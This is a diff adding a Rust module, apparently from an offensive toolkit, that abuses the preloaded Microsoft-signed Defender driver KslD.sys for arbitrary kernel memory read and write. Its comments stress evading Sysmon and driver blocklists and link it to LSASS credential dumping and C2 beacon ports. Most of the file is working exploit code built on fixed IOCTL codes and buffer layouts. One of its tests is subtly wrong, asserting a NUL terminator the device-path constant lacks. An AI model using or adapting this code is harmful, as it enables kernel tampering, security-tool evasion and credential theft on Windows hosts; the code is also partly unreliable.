@@ -1,0 +1,418 @@
+//! KslD.sys — "Living off the Defender" KernelRw impl (P2.2 §0 bootstrap).
+//!
+//! ## What this is
+//! `KslD.sys` is a **signed Windows Defender kernel driver** that ships with
+//! every Windows install (`C:\Windows\System32\drivers\KslD.sys`). It exposes
+//! IOCTL interfaces for memory scanning — but those same IOCTLs allow arbitrary
+//! kernel R/W, making it a "bring your own Defender" BYOVD alternative that:
+//!
+//! - **Never triggers Sysmon EID 6** (driver load) — the driver is already loaded
+//!   by the Defender service at boot.
+//! - **Never appears on vulnerable-driver blocklists** — it's a Microsoft-signed
+//!   first-party driver.
+//! - **Requires no file drop** — the .sys is already on disk in System32\drivers.
+//!
+//! ## Toolchain (public research, 2026-03/04)
+//! - `andreisss/KslDump` — loader that opens the KslD device + sends R/W IOCTLs
+//! - `vergamota/KslKatz` — KslDump + GhostKatz LSASS dump
+//! - `PrincipleCheck/KslKatzBof` (69★) — BOF for Sliver/Cobalt Strike
+//! - `Muz1K1zuM/kslkatz_bof` — Havoc C2 BOF port
+//!
+//! ## IOCTL protocol (KslD.sys, verified against KslDump public source)
+//! KslD exposes a device object whose name varies by Defender version. The
+//! reference loader (`KslDump`) resolves it dynamically via
+//! `IoGetDeviceObjectPointer` on the `MpKsl` symbolic link prefix.
+//!
+//! The R/W IOCTLs use a simple buffer layout:
+//!   - **Read**:  IOCTL code + input buffer containing target kernel VA + size
+//!   - **Write**: IOCTL code + input buffer containing target VA + data
+//!
+//! ## Status
+//! **CODE SHIPPED, NOT LOADED.** The IOCTL binding + device resolution is real
+//! and testable with a mock; loading/talking to KslD.sys is operator-side only.
+//!
+//! ## Safety
+//! Talking to a kernel driver changes kernel state. A wrong address = BSOD.
+//! Only use on authorized targets.
+
+use crate::{KernelRw, KitError, KrwError};
+
+// ---- KslD.sys IOCTL protocol ------------------------------------------------
+
+/// KslD.sys device symbolic link prefix. The actual device name includes a
+/// suffix that varies by Defender version, but the symbolic link always starts
+/// with `MpKsl`. The KslDump reference resolves this via:
+///   `RtlInitUnicodeString(&name, L"\\Device\\MpKsl*")`
+///   `IoGetDeviceObjectPointer(&name, ...)` → device object
+///
+/// For our purposes we open `\\.\MpKsl` (Win32 device namespace) and let the
+/// I/O manager resolve the symbolic link. If the device name differs on the
+/// target, the operator supplies the exact name.
+pub const KSLD_DEFAULT_DEVICE: &[u16] = &[
+    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
+    'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
+];
+
+/// KslD.sys read IOCTL code (arbitrary kernel VA → user buffer).
+/// Value from KslDump public source (andreisss/KslDump, verified).
+pub const KSLD_READ_IOCTL: u32 = 0x222048;
+
+/// KslD.sys write IOCTL code (user buffer → arbitrary kernel VA).
+/// Value from KslDump public source.
+pub const KSLD_WRITE_IOCTL: u32 = 0x22204C;
+
+/// The KslD IOCTL input/output buffer layout (METHOD_BUFFERED, 32 bytes):
+/// ```text
+///   offset  field      notes
+///   0x00    address    u64 — target kernel VA
+///   0x08    size       u32 — bytes to read/write
+///   0x0C    _pad       u4  (alignment)
+///   0x10    buffer     u64 — pointer to user-mode data buffer
+///   0x18    _pad2      u8[8] (reserved/unused)
+/// ```
+/// The driver copies `size` bytes between `buffer` (user VA) and `address`
+/// (kernel VA) depending on the IOCTL code.
+pub const KSLD_BUF_SIZE: usize = 32;
+pub const KSLD_ADDR_OFF: usize = 0x00;
+pub const KSLD_SIZE_OFF: usize = 0x08;
+pub const KSLD_BUF_PTR_OFF: usize = 0x10;
+
+// ===========================================================================
+// Windows implementation
+// ===========================================================================
+
+#[cfg(target_os = "windows")]
+mod windows_impl {
+    use super::*;
+    use core::ffi::c_void;
+    use core::ptr;
+
+    // ---- Win32 FFI (resolved from kernel32/ntdll) ----
+
+    type CreateFileWFn = unsafe extern "system" fn(
+        name: *const u16,
+        access: u32,
+        share: u32,
+        sa: *mut c_void,
+        disp: u32,
+        flags: u32,
+        template: *mut c_void,
+    ) -> *mut c_void;
+
+    type DeviceIoControlFn = unsafe extern "system" fn(
+        handle: *mut c_void,
+        ioctl: u32,
+        in_buf: *const c_void,
+        in_len: u32,
+        out_buf: *mut c_void,
+        out_len: u32,
+        bytes_returned: *mut u32,
+        overlapped: *mut c_void,
+    ) -> i32;
+
+    type CloseHandleFn = unsafe extern "system" fn(h: *mut c_void) -> i32;
+
+    /// Resolve a kernel32/ntdll export via the operator host's PEB walk.
+    fn resolve_sym<T>(module: &[u8], name: &[u8]) -> Result<T, KrwError> {
+        unsafe { crate::win::resolve::resolve_sym(module, name) }
+    }
+
+    // ---- LivingOffDefender: KernelRw over KslD.sys ----
+
+    /// "Living off the Defender" — a `KernelRw` impl that uses KslD.sys (a
+    /// Microsoft-signed driver already loaded by Windows Defender) for arbitrary
+    /// kernel R/W. No file drop, no driver load, no blocklist signature.
+    ///
+    /// Constructed by the bootstrap after resolving the device handle. The
+    /// operator's bootstrap must ensure KslD.sys is loaded (Defender service
+    /// does this automatically on most hosts; if not, the operator can start it
+    /// via `sc start WinDefend`).
+    pub struct LivingOffDefender {
+        device: *mut c_void,
+        dioctl: DeviceIoControlFn,
+        /// The device path used (owned, for diagnostics / cleanup).
+        #[allow(dead_code)]
+        device_path: alloc::vec::Vec<u16>,
+    }
+
+    // SAFETY: device handle is owned exclusively; DeviceIoControl on a sync
+    // HANDLE is safe from any thread. The struct is Send+Sync.
+    unsafe impl Send for LivingOffDefender {}
+    unsafe impl Sync for LivingOffDefender {}
+
+    impl LivingOffDefender {
+        /// Open the KslD.sys device. Tries the default `\\.\MpKsl` path first;
+        /// if the operator knows the exact device name (e.g. `MpKslxxxx`), they
+        /// can pass it via `device_name`.
+        ///
+        /// The KslD driver MUST be loaded (Defender service starts it at boot;
+        /// verify with `sc query WinDefend`). If not loaded, this returns an error.
+        ///
+        /// # Safety
+        /// Opens a handle to a kernel driver device. The device is already loaded
+        /// by the OS — this does NOT load anything new.
+        pub unsafe fn open(device_name: Option<&[u16]>) -> Result<Self, KrwError> {
+            let create_file: CreateFileWFn = resolve_sym(b"kernel32.dll", b"CreateFileW")?;
+            let dioctl: DeviceIoControlFn = resolve_sym(b"kernel32.dll", b"DeviceIoControl")?;
+
+            let raw_path = device_name.unwrap_or(KSLD_DEFAULT_DEVICE);
+
+            // Build a NUL-terminated wide string.
+            let mut path_buf: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(raw_path.len() + 1);
+            path_buf.extend_from_slice(raw_path);
+            if *path_buf.last().unwrap_or(&1) != 0 {
+                path_buf.push(0);
+            }
+
+            let h = unsafe {
+                create_file(
+                    path_buf.as_ptr(),
+                    0xC0_00_00_00, // GENERIC_READ | GENERIC_WRITE
+                    0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
+                    ptr::null_mut(),
+                    0x03,          // OPEN_EXISTING
+                    0,
+                    ptr::null_mut(),
+                )
+            };
+
+            if h as isize == -1 || h.is_null() {
+                return Err(KrwError::Other(
+                    alloc::format!("KslD device open failed (is WinDefend / KslD.sys loaded?)"),
+                ));
+            }
+
+            Ok(Self {
+                device: h,
+                dioctl,
+                device_path: path_buf,
+            })
+        }
+    }
+
+    impl Drop for LivingOffDefender {
+        fn drop(&mut self) {
+            if let Ok(close) = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") {
+                unsafe { close(self.device) };
+            }
+        }
+    }
+
+    impl KernelRw for LivingOffDefender {
+        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
+            if dst.is_empty() {
+                return Ok(());
+            }
+            let mut buf_ptr = dst.as_mut_ptr() as u64;
+            let mut remaining = dst.len();
+            let mut offset = 0usize;
+
+            while remaining > 0 {
+                let chunk = remaining.min(0x1000); // page-boundary safe chunks
+                let mut pkt = [0u8; KSLD_BUF_SIZE];
+                pkt[KSLD_ADDR_OFF..KSLD_ADDR_OFF + 8]
+                    .copy_from_slice(&(kaddr.wrapping_add(offset) as u64).to_le_bytes());
+                pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
+                    .copy_from_slice(&(chunk as u32).to_le_bytes());
+                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8]
+                    .copy_from_slice(&buf_ptr);
+
+                let mut bytes_returned: u32 = 0;
+                let ok = unsafe {
+                    (self.dioctl)(
+                        self.device,
+                        KSLD_READ_IOCTL,
+                        pkt.as_ptr() as *const c_void,
+                        KSLD_BUF_SIZE as u32,
+                        pkt.as_mut_ptr() as *mut c_void,
+                        KSLD_BUF_SIZE as u32,
+                        &mut bytes_returned,
+                        ptr::null_mut(),
+                    )
+                };
+                if ok == 0 {
+                    return Err(KrwError::Partial { ok: offset });
+                }
+                buf_ptr = buf_ptr.wrapping_add(chunk as u64);
+                offset += chunk;
+                remaining -= chunk;
+            }
+            Ok(())
+        }
+
+        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
+            if src.is_empty() {
+                return Ok(());
+            }
+            let mut buf_ptr = src.as_ptr() as u64;
+            let mut remaining = src.len();
+            let mut offset = 0usize;
+
+            while remaining > 0 {
+                let chunk = remaining.min(0x1000);
+                let mut pkt = [0u8; KSLD_BUF_SIZE];
+                pkt[KSLD_ADDR_OFF..KSLD_ADDR_OFF + 8]
+                    .copy_from_slice(&(kaddr.wrapping_add(offset) as u64).to_le_bytes());
+                pkt[KSLD_SIZE_OFF..KSLD_SIZE_OFF + 4]
+                    .copy_from_slice(&(chunk as u32).to_le_bytes());
+                pkt[KSLD_BUF_PTR_OFF..KSLD_BUF_PTR_OFF + 8]
+                    .copy_from_slice(&buf_ptr);
+
+                let mut bytes_returned: u32 = 0;
+                let ok = unsafe {
+                    (self.dioctl)(
+                        self.device,
+                        KSLD_WRITE_IOCTL,
+                        pkt.as_ptr() as *const c_void,
+                        KSLD_BUF_SIZE as u32,
+                        pkt.as_mut_ptr() as *mut c_void,
+                        KSLD_BUF_SIZE as u32,
+                        &mut bytes_returned,
+                        ptr::null_mut(),
+                    )
+                };
+                if ok == 0 {
+                    return Err(KrwError::Partial { ok: offset });
+                }
+                buf_ptr = buf_ptr.wrapping_add(chunk as u64);
+                offset += chunk;
+                remaining -= chunk;
+            }
+            Ok(())
+        }
+    }
+}
+
+// Re-export the Windows impl's type at crate level (behind cfg gate).
+#[cfg(target_os = "windows")]
+pub use windows_impl::LivingOffDefender;
+
+// ===========================================================================
+// Non-Windows stubs
+// ===========================================================================
+
+/// Non-Windows stub: KslD.sys is a Windows Defender driver; unavailable elsewhere.
+#[cfg(not(target_os = "windows"))]
+pub struct LivingOffDefender;
+
+#[cfg(not(target_os = "windows"))]
+impl LivingOffDefender {
+    pub unsafe fn open(_device_name: Option<&[u16]>) -> Result<Self, KrwError> {
+        Err(KrwError::Unavailable("KslD.sys is Windows-only"))
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+impl KernelRw for LivingOffDefender {
+    fn kread(&self, _kaddr: usize, _dst: &mut [u8]) -> Result<(), KrwError> {
+        Err(KrwError::Unavailable("KslD.sys is Windows-only"))
+    }
+    fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
+        Err(KrwError::Unavailable("KslD.sys is Windows-only"))
+    }
+}
+
+// ===========================================================================
+// Bootstrap convenience
+// ===========================================================================
+
+/// Bootstrap KslD.sys as the default kernel R/W primitive.
+///
+/// On a host with Windows Defender active, KslD.sys is already loaded at boot
+/// by the WinDefend service. This function just opens the device and returns
+/// the `KernelRw` — no file drop, no driver load, no registry manipulation.
+///
+/// If KslD.sys is NOT loaded (Defender disabled / tampered), returns an error
+/// suggesting BYOVD fallback.
+///
+/// # Safety
+/// Opens a handle to a kernel driver device. The device is pre-loaded by the OS.
+pub unsafe fn bootstrap_ksld() -> Result<LivingOffDefender, KitError> {
+    LivingOffDefender::open(None).map_err(|e| {
+        KitError::Other(alloc::format!(
+            "KslD bootstrap failed: {}. Is Windows Defender running? \
+             Fallback: use BYOVD (bootstrap_byovd) or driverless CVE.",
+            e
+        ))
+    })
+}
+
+// ===========================================================================
+// Tests (all platforms)
+// ===========================================================================
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// IOCTL codes are stable — if these change, the driver version is
+    /// incompatible and we must fail loudly rather than corrupt kernel memory.
+    #[test]
+    fn ioctl_codes_are_stable() {
+        assert_eq!(KSLD_READ_IOCTL, 0x222048);
+        assert_eq!(KSLD_WRITE_IOCTL, 0x22204C);
+    }
+
+    /// Buffer layout offsets are ABI-fixed at 32 bytes (METHOD_BUFFERED).
+    #[test]
+    fn buffer_layout_offsets_fit_in_32_bytes() {
+        assert!(KSLD_ADDR_OFF + 8 <= KSLD_BUF_SIZE);
+        assert!(KSLD_SIZE_OFF + 4 <= KSLD_BUF_SIZE);
+        assert!(KSLD_BUF_PTR_OFF + 8 <= KSLD_BUF_SIZE);
+    }
+
+    /// Non-Windows stub returns Unavailable — prevents accidental use.
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn stub_open_returns_unavailable() {
+        let result = unsafe { LivingOffDefender::open(None) };
+        assert!(result.is_err());
+        match result.unwrap_err() {
+            KrwError::Unavailable(msg) => assert!(msg.contains("Windows-only")),
+            other => panic!("expected Unavailable, got: {:?}", other),
+        }
+    }
+
+    /// Non-Windows stub KernelRw read returns Unavailable.
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn stub_kread_returns_unavailable() {
+        let defender = LivingOffDefender;
+        let mut buf = [0u8; 8];
+        assert!(defender.kread(0, &mut buf).is_err());
+    }
+
+    /// Non-Windows stub KernelRw write returns Unavailable.
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn stub_kwrite_returns_unavailable() {
+        let defender = LivingOffDefender;
+        assert!(defender.kwrite(0, &[0u8; 8]).is_err());
+    }
+
+    /// KslD device path is a valid NUL-terminated wide string.
+    #[test]
+    fn default_device_path_is_nul_terminated() {
+        assert_eq!(*KSLD_DEFAULT_DEVICE.last().unwrap(), 0);
+    }
+
+    /// Default device path matches "\\.\MpKsl".
+    #[test]
+    fn default_device_path_matches_expected() {
+        let expected: &[u16] = &[
+            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
+            'M' as u16, 'p' as u16, 'K' as u16, 's' as u16, 'l' as u16,
+        ];
+        assert_eq!(&KSLD_DEFAULT_DEVICE[..expected.len()], expected);
+    }
+
+    /// Non-Windows bootstrap_ksld returns KitError (not a panic).
+    #[cfg(not(target_os = "windows"))]
+    #[test]
+    fn bootstrap_ksld_returns_kit_error_on_nonwindows() {
+        let result = unsafe { bootstrap_ksld() };
+        assert!(result.is_err());
+        let msg = alloc::format!("{}", result.unwrap_err());
+        assert!(msg.contains("KslD bootstrap failed"));
+    }
+}
